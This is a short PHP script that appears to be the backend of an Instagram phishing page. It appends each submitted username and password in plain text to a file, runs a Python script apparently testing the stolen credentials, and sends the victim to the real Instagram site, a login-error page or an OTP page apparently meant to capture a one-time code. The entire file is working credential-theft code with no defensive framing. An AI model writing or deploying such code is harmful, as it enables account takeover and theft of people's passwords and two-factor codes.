<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
$cmd ="python checkforverification.py"; 
$output = exec($cmd);

if ($output == "Success") {
    header('Location: https://instagram.com');
  }
if($output == "PasswordError") {
  header('Location:LoginError.html');
 
}
if ($output == "OTP") {
  header('Location: OTP.html');
}





exit();
